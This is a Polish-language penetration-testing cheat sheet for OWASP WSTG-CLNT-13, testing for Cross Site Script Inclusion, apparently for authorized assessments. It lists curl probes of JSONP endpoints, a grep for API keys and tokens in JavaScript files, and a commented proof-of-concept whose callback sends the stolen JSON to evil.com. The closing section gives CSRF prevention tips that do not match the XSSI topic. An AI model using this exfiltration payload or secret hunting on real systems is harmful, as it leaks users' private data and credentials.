# WSTG-CLNT-13 — Testing for Cross Site Script Inclusion (XSSI)

## Cele

- Locate sensitive data across the system
- Assess the leakage of sensitive data through various techniques

## KOMENDY

### Identyfikacja JSONP endpointow

```bash
curl -s "https://TARGET/api/data?callback=test" | head -50
curl -s "https://TARGET/api/user?jsonp=test" | head -50

```

### Test XSSI - wlaczenie skryptu z innej domeny

```bash
# PoC:
# <script src="https://TARGET/api/data?callback=steal"></script>
# <script>function steal(data){fetch('http://evil.com/?d='+JSON.stringify(data))}</script>

```

### Sprawdzenie dynamicznych JS z danymi

```bash
curl -s "https://TARGET/js/config.js" | grep -i "api_key\|token\|secret\|password"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings JSONP

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/jsonp_endpoint.txt

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Szukaj JSONP endpointow (callback=, jsonp=, cb=)
2. Sprawdz czy JSONP odpowiedzi zawieraja wrazliwe dane
3. Sprawdz dynamiczne pliki JS pod katem wrazliwych danych
4. Stworz PoC HTML importujacy skrypt z TARGET
5. Sprawdz Content-Type odpowiedzi (powinien byc application/json, nie text/javascript)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md

- Synchronizer token pattern — CSRF token w ukrytym polu formularza
- SameSite cookies jako dodatkowa warstwa (nie jedyna!)
- Custom request headers (X-Requested-With) dla AJAX
- Weryfikuj Origin i Referer headers server-side

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| CSRF Scanner | Automatyczne skanowanie podatnosci CSRF | [GitHub](https://github.com/ah8r/csrf) |
| EasyCSRF | Wykrywanie slabej ochrony CSRF | [GitHub](https://github.com/0ang3el/EasyCSRF) |
